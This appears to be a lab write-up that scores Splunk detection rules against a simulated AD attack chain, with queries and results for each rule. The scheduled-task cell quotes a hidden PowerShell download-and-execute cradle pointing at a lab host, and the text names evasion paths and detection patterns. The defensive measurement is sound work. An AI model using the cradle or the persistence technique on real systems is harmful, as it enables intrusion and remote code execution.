# v4 Coverage Matrix — before/after detection verdicts

The artefact v4 exists to produce. One column per state of the estate: the un-hardened
before-run, one per hardening bundle, and the full after-run. Built incrementally as each
measurement happens, never written at the end — a before/after table assembled afterwards
proves nothing, which is the whole argument of [the v4 plan](README.md).

**Every cell carries the SPL that produced it and the raw result.** A verdict without the query
behind it cannot be checked by a reader or by me, and this lab has already recorded two cells
that were reasoned about rather than run and turned out wrong. The cost of the extra lines is
the point of them.

## Marks

| Mark | Meaning |
| ---- | ------- |
| **M** | Measured — the phase ran against this state and the result was recorded |
| **→** | Carried forward; not re-measured against this state |
| **✓ fires** | The shipped rule returns at least one row for the attack |
| **✗ silent** | The attack ran and the shipped rule returns nothing |
| **N/E** | Not executable — the phase was not run, so there is no verdict to give |

`✗ silent` and `N/E` are kept apart deliberately. Silent is a finding about the rule; N/E is a
gap in the run. Collapsing them would let an unrun phase read as a working detection.

**How a verdict is obtained.** By re-running the shipped search verbatim over a window that
contains the attack — not by reading triggered-alert history. Two of the fifteen attack-facing
searches ship with `enableSched = 0` and never run on a schedule at all, so for those an absent
alert carries no information. Where the search as run differs from `savedsearches.conf` in any
way, the difference is stated in the cell.

## Before-run — un-hardened baseline, 6 Nov 2026

Chain executed 6 November, roughly 11:03 to 17:06 CET. Fifteen attack-facing searches; the
three pipeline-health searches are not detection cells and are not listed.

| # | Rule | Phase | Before | Mark |
| - | ---- | ----- | ------ | ---- |
| 1 | LOLBin Execution (CIM tstats) | 3 | N/E | — |
| 2 | C2 Beacon from User-Writable Path | 5b | **✓ fires on both hosts — and one allowlist gap** | M |
| 3 | Kerberoasting RC4 Service Ticket | 4a | **✗ silent — by design, the roast was AES** | M |
| 4 | Kerberoasting User-SPN (etype-agnostic) | 4a | **✓ fires** | M |
| 5 | Password Spray (multi-user from one source) | 2 | **✗ silent — one account below threshold** | M |
| 6 | Spray Success (4771 then 4768 same source) | 2 | **✓ fires — and one false positive** | M |
| 7 | SAM Hive Dump via reg save | 9b | N/E | — |
| 8 | DCSync from non-DC | 9c | N/E | — |
| 9 | Scheduled Task Persistence | 10 | **✓ fires — 1 of 1, no false positives** | M |
| 10 | LSASS Access (credential theft mask) | 8 | **✓ fires** | M |
| 11 | Kerbrute User Enumeration (4768 error 0x6) | 1 | **✗ silent — structural** | M |
| 12 | Verify Account Lockout (post FGPP) | 2 | **✓ fires, output unusable** | M |
| 13 | RC4 Anomaly (post AES enforcement) | 4a | **✗ silent — nothing to anomaly on yet** | M |
| 14 | Sliver C2 Beacon by JA4 Fingerprint | 5a | **✓ fires on one of two hosts** | M |
| 15 | Large Outbound Transfer | 11, 12 | **✓ fires on both exfils — and one false positive** | M |

**The column is complete: twelve measured, three N/E.** Seven fire, five are silent.

The split that matters is not fires-versus-silent. It is that **four of the seven that fire are
defective in ways a tick in this column would hide**:

| Rule | Fires on the attack, and also… |
| ---- | ------------------------------ |
| `#6` Spray Success | benign clock skew, ninety minutes before the chain |
| `#12` Verify Account Lockout | cannot say which account was locked — both output columns empty |
| `#2` C2 Beacon | `OneDrive\Update\OneDriveSetup.exe`, an allowlist gap |
| `#15` Large Outbound | 12.5 MB of ordinary Microsoft HTTPS, on a placeholder threshold |

Of the five silent, three are silent for reasons that are correct or by design (`#3`, `#11`,
`#13`), one is silent by a single account (`#5`), and **none are silent because the rule is
wrong.** That is the opposite of the v3 result, where rules failed by being wrong; here they
fail by being imprecise, which is harder to see and is why every cell carries its query.

Three cells are N/E by decision rather than by accident. A phase runs in the before-run only if
a shipped rule measures it **and** the after-run will run it too; dropping a phase from one
column alone would make the comparison asymmetric, so it is dropped from both. Phases 3 and 9b
were not executed. Phase 9c was attempted in an earlier run and failed at RPC 1825, and
repairing it mid-measurement would change the estate between columns.

---

## Cell detail

### #2 — C2 Beacon from User-Writable Path, phase 5b: ✓ fires on both hosts

This cell had three ways to come out empty and only one of them would have been about the rule,
so the controls came first. The rule runs over the `Network_Traffic` CIM model rather than a raw
sourcetype, and this lab has already shipped a rule that queried a model which never received the
events it needed.

**Control: the telemetry exists.**

```
index=main sourcetype=XmlWinEventLog EventCode=3 earliest=-1d latest=now
| stats count values(DestinationIp) as dests by Image
| sort -count
```

`C:\Temp\GlobalProtect_Update.exe` — 12 events, every one to `192.168.182.133`. Sysmon has it.

**Control: the model holds the path in a form the rule's pattern matches.** The `app` values come
back as `C:\Temp\GlobalProtect_Update.exe` — single backslashes, ordinary case — so `*\\Temp\\*`
matches. No silent normalisation mismatch, which was the real risk.

**The rule, verbatim** (including the `where NOT` OneDrive allowlist, which an earlier run of this
measurement omitted — the first version returned every OneDrive row the shipped rule suppresses):

```
| tstats summariesonly=false allow_old_summaries=true count values(All_Traffic.dest_port) as dest_ports
    from datamodel=Network_Traffic.All_Traffic
    where (All_Traffic.app="*\\Temp\\*" OR All_Traffic.app="*\\AppData\\*" OR All_Traffic.app="*\\ProgramData\\*" OR All_Traffic.app="*\\Users\\Public\\*")
    by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app _time span=1m
| rename "All_Traffic.*" AS *
| where NOT (like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe")
      OR like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe")
      OR like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\%\\OneDrive.Sync.Service.exe"))
| stats count dc(_time) as beacons earliest(_time) as firstTime latest(_time) as lastTime by src dest dest_port app
```

| src | dest | port | app | beacons | window | verdict |
| --- | ---- | ---- | --- | ------- | ------ | ------- |
| SPIDERMAN | `-` | 443 | `C:\Temp\GlobalProtect_Update.exe` | 6 | 6 Nov 12:04–12:09 | **true positive** |
| THEPUNISHER | `-` | 443 | `C:\Temp\GlobalProtect_Update.exe` | 1 | 6 Nov 16:48 | **true positive** |
| THEPUNISHER | `-` | 443 | `OneDrive\Update\OneDriveSetup.exe` | 2 | 2 Nov | **false positive** |
| THEPUNISHER | akamai | 80 | `OneDrive\Update\OneDriveSetup.exe` | 1 | 2 Nov | **false positive** |
| SPIDERMAN | `-` | 8089 | `C:\Temp\nettest.exe` | 1 | 31 Oct | own test binary, outside the chain |

**The strongest corroboration in this column.** SPIDERMAN's window here, 12:04 to 12:09, matches
`#14`'s JA4 window of 12:04:15 to 12:09:15 to the minute — two independent telemetry paths,
Sysmon `EventCode=3` through the CIM model and Zeek's TLS handshakes, agreeing on the same beacon.
Six one-minute buckets against eleven handshakes is consistent: the handshakes cluster inside
those minutes.

**And the two C2 rules are complementary, which neither description says.** `#14` is silent on
THEPUNISHER because one TLS handshake cannot clear `count > 5`. `#2` has THEPUNISHER, because it
counts a process connecting from a user-writable path rather than a beacon interval. Together
they cover both endpoints; **neither covers both alone.** The after-run should be read with that
pairing in mind — a bundle that breaks one does not necessarily lose the host.

**The allowlist gap is a real defect, not noise.** The three allowlist entries cover
`OneDrive\OneDrive.exe`, `OneDrive\OneDriveStandaloneUpdater.exe` and
`OneDrive\<version>\OneDrive.Sync.Service.exe`. They do not cover
`OneDrive\Update\OneDriveSetup.exe`, which is a fourth OneDrive binary in a fourth directory
shape, and it fires. The allowlist was measured against the benign window and this binary did not
run in it — the same blindness that `#10` and `#15` both hit, for the third time in this column.

**`dest` is empty on every beacon row.** The model returns `-` where the destination belongs,
while Sysmon knows it is `192.168.182.133`. So the alert names the process, the port and the host
it ran on, and not the thing it was talking to. That is the same defect class as `#12`'s empty
columns: the rule fires, and what it hands the analyst is missing the field they will ask for
first.

### #3 — Kerberoasting RC4 Service Ticket, phase 4a: ✗ silent, by design

The rule verbatim returns nothing. The control says why, positively rather than by inference:

```
index=main source="WinEventLog:Security" EventCode=4769 earliest=-1d latest=now
| stats count values(Service_Name) as services by Ticket_Encryption_Type
```

| Ticket_Encryption_Type | count | services |
| ---------------------- | ----- | -------- |
| `0x12` | 125 | `HYDRA-DC$`, `SPIDERMAN$`, `SQLService`, `THEPUNISHER$`, `krbtgt` |

Every service ticket the KDC issued in the window is AES-256. Not one `0x17`. The roast was an
AES roast, this rule keys on RC4 only, so its silence is the designed division of labour with
`#4` and not a gap. `#4` is the rule that has to catch this, and it does.

### #4 — Kerberoasting User-SPN (etype-agnostic), phase 4a: ✓ fires

```
index=main source="WinEventLog:Security" EventCode=4769
    Service_Name!="krbtgt*" Service_Name!="*$" Account_Name!="*$" Account_Name!="*$@*"
    earliest=-1d latest=now
| stats count min(_time) as firstTime max(_time) as lastTime values(Ticket_Encryption_Type) as etypes
      by Client_Address Account_Name Service_Name
| where NOT (Account_Name="tstark@MARVEL.LOCAL" AND Service_Name="SQLService"
      AND (Client_Address="::ffff:192.168.182.137" OR Client_Address="::ffff:192.168.182.138"))
| eval firstTime=strftime(firstTime,"%F %T"), lastTime=strftime(lastTime,"%F %T")
```

| Client_Address | Account_Name | Service_Name | count | firstTime | etypes |
| -------------- | ------------ | ------------ | ----- | --------- | ------ |
| `::ffff:192.168.182.133` | `fcastle@MARVEL.LOCAL` | `SQLService` | 1 | 6 Nov 11:48:12 | `0x12` |

One row, and it is the roast: the attacker host requesting a service ticket for a user-held SPN,
AES-encrypted, which is exactly what `#3` cannot see.

**This cell also validates a design decision that was previously only argued.** The rule ships
with an identity allowlist suppressing `tstark` → `SQLService` from the two workstations, added
after the benign baseline. The
[2 November method revision](benign-baseline.md) chose `tstark` for the benign traffic precisely
so the allowlist would not blind the rule to the attack, and the attack ran as `fcastle` from
`.133`. Both halves held: the benign principal is suppressed, the attack principal is not. That
was a prediction about an allowlist's blast radius, and it is now a measurement.

The residual risk the rule's own description names is unchanged and worth restating here, because
this cell is the thing that could be mistaken for closing it: a stolen `tstark` credential used
from `.137` or `.138` still falls inside the allowlist and would be suppressed.

### #5 — Password Spray, phase 2: ✗ silent, one account below threshold

The rule verbatim returns nothing. The control gives the exact arithmetic:

```
index=main source="WinEventLog:Security" EventCode=4771 earliest=-1d latest=now
| stats count dc(Account_Name) as accounts values(Account_Name) as targets by Failure_Code Client_Address
```

| Failure_Code | Client_Address | count | accounts | targets |
| ------------ | -------------- | ----- | -------- | ------- |
| `0x18` | `192.168.182.133` | 14 | **4** | Administrator, SQLService, pparker, tstark |
| `0x12` | `192.168.182.133` | 4 | 1 | tstark |
| `0x25` | `::ffff:192.168.182.138` | 4 | 2 | Administrator, `SPIDERMAN$` |

The rule counts `0x18 OR 0xE` and needs `unique_users >= 5`. From the attacker host it gets four,
and there is no `0xE` at all — `Guest` supplied the fifth via `0xE` in the 20 October run and has
been disabled since. So the rule is silent by exactly one account, which is the condition already
written into its description from two earlier runs. Nothing new there.

**What is new is the size of the gap between what the spray did and what the rule can count.**
The `#11` cell measured two unknown-principal errors in this same 11:32 minute, visible in Zeek
and absent from the Windows log, because an attempt against an account that does not exist
produces no `4771` of any code. So the spray touched **at least six** accounts. The rule sees
four. It needs five.

That is the finding, and it is sharper than "the threshold is too high for this estate": the
attack was **larger** than the threshold, and the telemetry reported it smaller — by exactly
enough to keep the rule quiet. A threshold tuned on what the Windows log can count is tuned on an
undercount, and the undercount is not constant, it grows with however many non-existent accounts
the attacker's wordlist happens to contain. The threshold stays at 5; detections are not tuned
down to a lab's account count. What changes is that the gap now has a number on both sides of it.

The `0x12` row is tstark post-lockout (`KDC_ERR_CLIENT_REVOKED`), and the `0x25` row is clock skew
from SPIDERMAN, not the attack — it is the same skew that produces the false positive in `#6`.

### #6 — Spray Success, phase 2: ✓ fires, and one false positive

```
index=main source="WinEventLog:Security" (EventCode=4771 OR (EventCode=4768 Result_Code="0x0")) earliest=-1d latest=now
| eval src=replace(Client_Address,"^::ffff:","")
| transaction src maxspan=10m
| search eventcount>5 EventCode=4768 EventCode=4771
| table _time src Account_Name eventcount
```

| `_time` | src | Account_Name | eventcount | verdict |
| ------- | --- | ------------ | ---------- | ------- |
| 6 Nov 11:32:00 | `192.168.182.133` | Administrator, SQLService, fcastle, pparker, tstark | 19 | true positive |
| 6 Nov 09:29:43 | `192.168.182.138` | Administrator, `SPIDERMAN$` | 10 | **false positive** |

The first row is the attack, and this is the rule that carries phase 2 after `#5` goes quiet: it
correlates failures and a success from one source instead of counting distinct accounts, so the
undercount that silences `#5` does not silence this.

The second row is not. It is ninety minutes before the chain started at 11:03, it is SPIDERMAN
rather than the attacker host, and the accounts are a machine account and the local
Administrator. The control above shows four `0x25` failures — `KRB_AP_ERR_SKEW`, clock skew —
from that host for those two accounts, so what the rule has transacted is ordinary authentication
that failed on time drift, plus successful TGTs in the same ten-minute window, totalling more
than five events with both codes present. The rule's shape cannot distinguish that from a spray
followed by a success, because structurally it is the same shape.

**The false-positive row is directly observed; its composition is reconstructed** from the
`0x25` control rather than from the transaction's own contents, which the rule's `table` does not
output. That reconstruction accounts for 4 of the 10 events and infers the remaining 6 are
successful `4768`s. Worth stating as inference, and worth confirming before the fix is designed.

No change is made now. A fix would most likely exclude `0x25` from the failure side, which is a
one-line change to a rule in the middle of a before/after measurement, so it waits for step 8
with the others. Recorded here so the after-run column is read knowing this rule has a benign
firing mode that has nothing to do with hardening.

### #9 — Scheduled Task Persistence, phase 10: ✓ fires, 1 of 1

The rule verbatim returns one row:

| `_time` | host | Account_Name | Task_Name | task_command | task_runas |
| ------- | ---- | ------------ | --------- | ------------ | ---------- |
| 6 Nov 17:19:10 | THEPUNISHER | `frankcastle` | `\Updater` | `powershell.exe` | `S-1-5-18` |

with `task_args` carrying the cradle in full:
`-WindowStyle Hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.182.133/update.ps1'))"`.

**Control: what the rule chose not to return.** Three `4698` events exist in the window.

```
index=main source="WinEventLog:Security" EventCode=4698 earliest=-1d latest=now
| rex "<Command>(?<task_command>[^<]+)</Command>"
| rex "<UserId>(?<task_runas>[^<]+)</UserId>"
| table _time host Account_Name Task_Name task_command task_runas
```

| host | Account_Name | Task_Name | task_command | task_runas | excluded by |
| ---- | ------------ | --------- | ------------ | ---------- | ----------- |
| THEPUNISHER | `frankcastle` | `\Updater` | `powershell.exe` | `S-1-5-18` | — (fires) |
| HYDRA-DC | `HYDRA-DC$` | Windows Defender Scheduled Scan | `MpCmdRun.exe` | `S-1-5-18` | `Account_Name!="*$"` |
| HYDRA-DC | `Administrator` | `\CreateExplorerShellUnelevatedTask` | `C:\Windows\Explorer.EXE` | `MARVEL\Administrator` | the `where` clause |

One true positive, two benign, both correctly rejected, and **by different mechanisms** — which is
what makes this a real negative test rather than an absence of noise. The Defender task runs as
`S-1-5-18` and would have satisfied `runas_system=1`; the only thing that stops it is
`Account_Name!="*$"`. The rule's own description calls that filter load-bearing rather than
hygiene, and this is it being load-bearing. The Explorer task passed the machine-account filter
and was rejected on the merits: not SYSTEM, no user-writable command path, no cradle.

**The v3 gap is closed, and measurably.** In v3 this task was caught only by the SYSTEM-runas
branch, because `<Command>` is `powershell.exe` and the whole cradle sits in `<Arguments>`, so
both path tests miss. The Arguments branch added afterwards now catches it too. Two independent
branches fire on the same row, which means the same task created in a user context — the case v3
noted would have walked through — is now covered. That was the point of the fix and this is the
first run where both branches had the chance to prove it.

The known evasion the rule leaves open on purpose is untouched by this cell: a command path
written as `%APPDATA%\evil.exe` still matches neither path branch, and the decision not to add an
environment-variable branch was measured and recorded rather than assumed.

### #10 — LSASS Access, phase 8: ✓ fires

Measured on 6 November and written up in full, including a false-positive source the benign
window could not contain, in
[the v4 README's before-run section](README.md#before-run-detection-measurement-6-nov-2026--two-cells-closed-and-a-false-positive-source-the-benign-window-could-not-see).
The attack row:

| Time | Host | SourceImage | GrantedAccess |
| ---- | ---- | ----------- | ------------- |
| 6 Nov 17:06:07 | THEPUNISHER | `notepad.exe` | `0x1f3fff` |

`SharpKatz` ran through Sliver's `execute-assembly`, which executes in a sacrificial process, so
the beacon path never appears as `SourceImage`. A cell written from a search for the beacon path
would have read as a miss while the rule had in fact fired.

### #11 — Kerbrute User Enumeration, phase 1: ✗ silent, structural

The rule, verbatim, over a window containing the enum:

```
index=main source="WinEventLog:Security" EventCode=4768 Result_Code="0x6" earliest=-1d latest=now
| bucket _time span=1m
| stats count dc(Account_Name) as unique_users by _time Client_Address
| where count > 50 AND unique_users > 20
```

No rows. On its own that is ambiguous — a rule returns nothing both when it cannot see an attack
and when no attack arrived — so two controls separate the cases.

**Control 1: the DC emits no `0x6` at all.**

```
index=main source="WinEventLog:Security" EventCode=4768 earliest=-1d latest=now
| stats count by Result_Code
```

| Result_Code | count |
| ----------- | ----- |
| `0x0` | 55 |

Fifty-five tickets in the window, every one of them a success. Not one `0x6`. The rule's
predicate can never be satisfied on this estate: Windows does not write a `4768` for a principal
that does not exist, with Failure auditing on or off, which `auditpol` confirmed separately.

**Control 2: the enum did arrive, and another layer has it.**

```
index=main sourcetype=zeek "KDC_ERR_C_PRINCIPAL_UNKNOWN" earliest=-1d latest=now
| rex field=source "/current/(?<log_file>[^/]+)"
| where log_file="kerberos.log"
| bucket _time span=1m
| stats count by _time
| sort _time
```

| `_time` | count | phase |
| ------- | ----- | ----- |
| 6 Nov 11:03 | 57 | enum |
| 6 Nov 11:32 | 2 | spray |

Fifty-nine unknown-principal errors on the wire, all from `192.168.182.133`. The 57 at 11:03
match the enum exactly — 58 names tried, one valid, 57 unknown — so the attack reached the KDC
and the KDC answered it. Windows recorded none of it.

**Verdict: `✗ silent`, and the reason is structural rather than a threshold.** Lowering
`count > 50 AND unique_users > 20` would change nothing, because the event the rule counts is
never written. This reproduces in v4 the v3 finding that
[Zeek recorded a spray attempt the Windows log never did](../v3/README.md#findings); the rule is
kept rather than deleted because it is correct against a KDC that does log `0x6`, and the cell is
the evidence that this one does not.

**A note for anyone re-running control 2.** It also returns one hit in `http.log` from
`192.168.182.1`, which is not evidence of anything: that is the browser running the Splunk search,
and the search string `KDC_ERR_C_PRINCIPAL_UNKNOWN` crossed the monitored segment inside the HTTP
request to Splunk Web on `:8000`. Zeek recorded the act of looking. Ignore it.

**Carried into the `#5` cell.** The two errors at 11:32 fall in the spray window, not the enum,
and they are accounts the spray touched that produce no `4771` at all. The `#5` rule counts
distinct accounts from `4771`, so its account count understates what the spray actually tried —
by exactly two here. That caveat was already written into the rule's description from the v3 case
file; this is the first time there is a number on it.

### #12 — Verify Account Lockout, phase 2: ✓ fires, and the output is unusable

This rule ships with `enableSched = 0`, so it has no triggered-alert history and an absent alert
would carry no information. Measured by running it:

```
index=main source="WinEventLog:Security" EventCode=4740 earliest=-1d latest=now
| table _time Target_User_Name Caller_Computer_Name
```

| `_time` | Target_User_Name | Caller_Computer_Name |
| ------- | ---------------- | -------------------- |
| 6 Nov 11:32:05.999 | *(empty)* | *(empty)* |
| 6 Nov 11:32:05.998 | *(empty)* | *(empty)* |

Two rows at the right moment — the lockout did happen and the rule did find it — and both
columns blank. An analyst receiving this alert learns that something was locked out and nothing
about what. **The defect has two separate causes and only one of them is the rule's fault.**

**`Target_User_Name` is the wrong field name.** The data is present, under three other names.
From the raw event:

| Field | Value |
| ----- | ----- |
| `Account_Locked_Out_Name` | `tstark` |
| `Account_Locked_Out_Security_ID` | `S-1-5-21-…-1110` |
| `user`, `src_user` | `tstark` |
| `Account_Name` | multivalue: `HYDRA-DC$`, `tstark` |

The Splunk Add-on for Windows extracts the locked-out principal as `Account_Locked_Out_Name`.
`Target_User_Name` is simply not a field this source produces, so the rule tables an empty column
where the entire point of the alert belongs. This is the third instance in this repo of a rule
keyed on a field whose name or format was guessed rather than read off the data — the
[Zeek Kerberoasting filter](../detections/sigma/v3_ndr.yml) and the `props.conf` sourcetype were
the first two. None of the three were found by reading the rule.

**`Caller_Computer_Name` is structurally empty and no field name would fix it.** The event's own
message ends with the label and no value:

```
Additional Information:
	Caller Computer Name:
```

Windows wrote the `4740` without populating it. So the rule is tabling a column that cannot hold
a value on this estate, and the consequence is worth naming: **`4740` alone cannot attribute a
lockout to a source.** The spray came from `192.168.182.133` and this event does not say so. That
attribution requires correlating with `4771`, which is what `#6` does — so the two rules are
complementary in a way that neither description states.

**One more thing an analyst would notice before anyone else does.** There are two events one
millisecond apart (`RecordNumber` 2319917 and 2319918) for the same account, so the alert shows
two rows for one lockout. Minor, but it is the kind of thing that erodes trust in a feed.

The fix — `Account_Locked_Out_Name` in place of `Target_User_Name`, and `Caller_Computer_Name`
dropped or replaced with the correlation — is held for step 8 with the others, so the rule does
not change between the before and after columns.

### #13 — RC4 Anomaly, phase 4a: ✗ silent, nothing to anomaly on yet

```
index=main source="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type="0x17" earliest=-1d latest=now
| stats count by Service_Name Ticket_Encryption_Type
```

No rows, on the same control as `#3`: 125 service tickets in the window, all `0x12`, no `0x17`
anywhere. The rule's premise is that after AES enforcement every surviving `0x17` is an anomaly,
so a silent result pre-hardening is the expected reading and not a finding.

**This cell is the weakest of the nine and the reason is worth stating.** The before column
cannot test this rule, because the condition it inverts — AES enforcement — is a hardening bundle
that has not been applied. It is silent now and it will be silent in the after-run too if
enforcement works, which means a `✗ silent → ✗ silent` row that looks like a detection failure
and is nothing of the kind. Its real test is negative: after enforcement, a deliberate RC4
request should produce a row. That test belongs to the after-run and is recorded here as owed, so
the pair of silences is not read as a gap.

### #14 — Sliver C2 Beacon by JA4, phase 5a: ✓ fires on one of two hosts

Measured on 6 November, written up in the same section. The shipped fingerprint matches the one
the run produced exactly, with no drift from v3:

| Host | Handshakes | Window | Mean interval | Jitter | Rule |
| ---- | ---------- | ------ | ------------- | ------ | ---- |
| SPIDERMAN (`.138`) | 11 | 12:04:15–12:09:15 | 30.0 s | 23.9 s | fires |
| THEPUNISHER (`.137`) | 1 | — | n/a | n/a | silent |

The fingerprint is present on both endpoints and the alert covers one, because `where count > 5`
needs more than a single handshake to call something a beacon. The cell is recorded as `✓ fires`
with that asymmetry named, since reading the alert alone loses half the evidence.

---

### #15 — Large Outbound Transfer, phases 11 and 12: ✓ fires on both exfils, plus one false positive

`enableSched = 0`, so measured by running the search. Three rows:

| `_time` | orig_h | MB out | ports | verdict |
| ------- | ------ | ------ | ----- | ------- |
| 6 Nov 17:20 | `192.168.182.137` | 14.3 | 80, 138, 443, **8080** | IPv4 exfil |
| 6 Nov 17:30 | `fd15:…:336d:c973` | 66.8 | 136, 443, **8080**, 8081 | IPv6 exfil |
| 6 Nov 16:40 | `192.168.182.137` | 12.5 | 80, 137, 138, 443 | **false positive** |

Both exfiltration phases fire, including the IPv6 one — the rule's IPv6 branch works against a
real transfer, which is the first time it has been exercised.

**The third row, attributed.** The `values(resp_p)` list in the rule's output names which ports
appeared and says nothing about how the bytes divide, so the row had to be broken down before it
could be called anything:

```
… | where orig_h="192.168.182.137" AND _time>=…16:40 AND _time<…16:50
| stats sum(orig_bytes) as bytes by resp_h resp_p service | sort -bytes
```

| resp_h | port | service | bytes |
| ------ | ---- | ------- | ----- |
| `20.209.97.107` | 443 | ssl | **13,091,342** |
| `192.168.182.131` | 9997 | — | 2,573,830 |
| `4.208.165.242` | 443 | ssl | 24,278 |
| `192.168.182.255` | 137 | dns | 150 |

One destination accounts for all of it: 12.5 MB of ordinary Microsoft HTTPS. A hypothesis that
NetBIOS broadcast was inflating the total was wrong by four orders of magnitude — port 137
contributed 150 bytes. And the forwarder exclusion works: 2.57 MB to `.131:9997` is in the raw
data and absent from the rule's 12.48 MB sum.

So this is the placeholder threshold doing exactly what its own description predicts: 10 MB per
10 minutes was never calibrated and a single Windows service download clears it.

**Which makes it the third instance of one pattern, and that pattern is the finding.** This false
positive could not have appeared in the benign baseline, because the guests had no working egress
during that window (the dated 6 November note in [the v4 README](README.md) has the measurements)
— so the baseline measured `Large Outbound` against telemetry traffic only and found four rows,
all of them monitoring. Alongside `#10` (a benign LSASS reader that needs a Sysmon restart the
window contained none of) and `#2` (a fourth OneDrive binary that did not run in the window), that
is three rules whose false-positive profile the benign window was structurally unable to measure.
Three independent cases, one cause: **a false positive the baseline cannot see is a false positive
whose trigger the baseline's conditions excluded.** For `#15` the excluded condition is the thing
step 8 exists to fix, which means its threshold cannot be calibrated until that is done — the
rule and the fix are waiting on the same event.

---

## Still owed to this matrix

Two things this column does not yet have, recorded so they are not discovered later as gaps.

**The other four detection layers.** Every cell above is Splunk. The v3 matrix carried five
sources per phase — Splunk, Zeek, Suricata, Wazuh, and the Windows log itself — and two cells here
already depend on Zeek to mean anything (`#11`, where Zeek holds the only record of the enum, and
`#5`, where it supplies the undercount). Wazuh and Suricata are unexamined for this run. An empty
Wazuh column is a finding; an unmentioned one is an error.

**The fixes this column has earned, all held until step 8.** Five rules want changes that are
deliberately not being made, because changing a rule between the before and after columns
destroys the comparison those columns exist to make:

| Rule | Change owed | Why it waits |
| ---- | ----------- | ------------ |
| `#10` LSASS Access | exclude `C:\Windows\Sysmon64.exe` | fires benignly after a DC Sysmon restart, which the bundles will cause |
| `#12` Verify Account Lockout | `Account_Locked_Out_Name`; drop `Caller_Computer_Name` | fires correctly, reports nothing usable |
| `#6` Spray Success | exclude `0x25` from the failure side | benign clock skew satisfies the rule's shape |
| `#2` C2 Beacon | extend the OneDrive allowlist to `OneDrive\Update\OneDriveSetup.exe` | a fourth OneDrive binary in a fourth directory shape |
| `#15` Large Outbound Transfer | calibrate the placeholder threshold | needs the second benign window's real egress, which does not exist yet |

`#13` is owed a positive test rather than a fix: after AES enforcement, a deliberate RC4 request
should produce a row, and without that test its two silences prove nothing.

`#2` and `#15` are owed something beyond their own fix, and it is the same thing. Both have a
`dest`-shaped hole — `#2` because the CIM model returns `-` where the destination belongs, `#15`
because its output names ports and not the bytes behind them. In both cases the rule fires and
the analyst's first question is the one the output cannot answer. Neither is a tuning problem.
